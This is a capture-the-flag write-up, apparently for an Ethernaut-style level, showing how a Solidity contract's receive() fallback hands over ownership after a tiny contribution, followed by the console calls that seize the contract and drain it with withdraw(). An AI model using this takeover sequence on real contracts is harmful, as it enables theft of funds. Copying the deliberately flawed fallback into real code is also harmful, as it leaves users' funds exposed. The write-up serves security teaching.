This level is a good intro to how fallback functions can be exploited by a crafty adversary.

### At first glance
The goal of this challenge is to grab ownership of the contract and drain it of its funds.

This contract is relatively simple to understand. The first thing I see regarding ownership change is in the `contribute` function:
```javascript
// mapping between an address and its contribution amount
mapping(address => uint) public contributions;

//...

// basically, if you've contributed more than the owner, you're you are de captian now
if(contributions[msg.sender] > contributions[owner]) {
    owner = msg.sender;
}
```

Sounds simple enough. BUT in the contract's constructor method (which only runs on contract creation):
```javascript
// the owner gets a hard coded 1000 ether contribution value at creation
contributions[msg.sender] = 1000 * (1 ether);
```

So, unless you want to yeet > 1000 Ether into this contract, there needs to be another way.

## Solution
The solution is in the contract's fallback function:

```javascript
// no name or arguments
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

Some key considerations of fallbacks in Solidity:
* Executed if
  * No functions match the function identifier
  * No data was provided with the function call
* Only one per contract
* Executed when the contract receives Ether without any data
* If marked as payable, allows the contract to receive Ether, otherwise will throw an exception

To solve this level, we:
1. Make a contribution to the contract
```javascript
// We make a contribution first to satisfy the
// fallback function's "contributions[msg.sender] > 0 requirement
contract.contribute({ value: toWei("0.001", ether), from: player })
```
2. We then trigger the fallback
```javascript
// we can name this anything
// and we send ETH to satisfy the fallback's msg.value > 0 requirement
sendTransaction({ to: contract.address, value: toWei("0.001", ether), from: player })
```
3. Verify ownership
```javascript
await contract.owner()
```
4. Drain it for all it's worth
```javascript
contract.withdraw()
```

 